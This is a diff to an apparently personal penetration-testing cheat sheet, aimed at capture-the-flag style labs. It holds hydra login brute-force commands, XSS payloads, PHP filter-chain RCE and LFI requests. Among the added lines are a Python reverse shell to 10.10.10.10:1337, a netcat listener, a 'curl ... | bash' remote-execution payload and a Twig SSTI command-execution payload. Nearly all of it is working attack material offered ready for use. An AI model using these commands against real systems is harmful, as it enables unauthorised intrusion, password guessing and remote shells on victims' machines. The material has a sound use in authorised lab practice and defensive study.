@@ -1,5 +1,11 @@
 # Common Commands/Techniques I Use Frequently (In no particular order)
 
+Fave Resources
+------
+- https://swisskyrepo.github.io/PayloadsAllTheThings/
+- https://exploit-notes.hdks.org/
+- https://book.hacktricks.wiki/en/index.html
+
 Misc Commands
 ------
 ### Grep
@@ -69,6 +75,13 @@ Login Brute Forcing
 so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.174.201 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=c7UvYlF%2FOoYdanjSx3HqFGCZ9ktcaqHpKyHHiKbVfNezx4JX%2BkvSkLj9IH9GbWF4z41mnESai4vX%2FkWm576GotEhS3W66Cvoz9as16iMPgK0d6yqjJHRpODyonGR2%2Fp3%2FIM8LcN%2Fr5X7zNiaYMnBzEAjp8eFYgBqjCVyUgoP2v7tqlHu&__EVENTVALIDATION=PknlTsjoXO2tIIQR4GG4BnQkewRFwQjxfpAKT06eOvI%2FL%2F07msVZ7JUQ4nBX7RAnbfZRdZ2%2B4gUl2BdBAuoEtbsQww69pvT2jUbpA%2F00YfgzuX8de4fjki4HfD4SDig3jJjMjZoQBLYOdW2Y%2B8W%2FTf17Bdd0hRBOzS%2BpvBmRWe0UIBx7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv`
 - Using hydra with some parameters instead of the entire login request example `hydra -l milesdyson -P log1.txt 10.x.x.x http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user`
 - Using hydra to brute force a basic auth page `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt -s 80 -f enum.thm http-get /labs/basic_auth`
+
+Easy Reverse Shell
+------
+- Copy python reverse shell into an index.html file, example contents `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`
+- Start a web server on your machine where you put the index.html file `python3 -m http.server 8000`
+- Start a listener for the reverse shell `nc -nvlp 1337`
+- Access the file by curl'ing the URL then pipe to bash in your vulnerable parameter/on the victim machine (e.g. payload for RCE: `curl 10.10.10.10:8000|bash`)
 
 Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
 ------
@@ -146,7 +159,6 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
 - `<iframe src=javascript:alert(1337)>`
 - `<object data="data:text/html,<script>alert(1337)</script>"></object>`
 - `<script src=data:text/javascript,alert(1337)></script>`
-
 ### PHP
 #### Filters Chaining
 - If you notice a parameter using PHP filters there's a chance it may be susceptible to RCE via filter chaining. Example URL `/secret-script.php?file=php://filter/resource=supersecretmessageforadmin`
@@ -157,3 +169,5 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
   - Execute the payload by requesting the following URL (the above vulnerable parameter has been used as an example) `/secret-script.php?file=<generated_chain>`
 #### LFI
 - LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
+### SSTI
+- On Twig version 2.14.0 or below with the sandbox mode enabled `{{['id',""]|sort('passthru')}}`
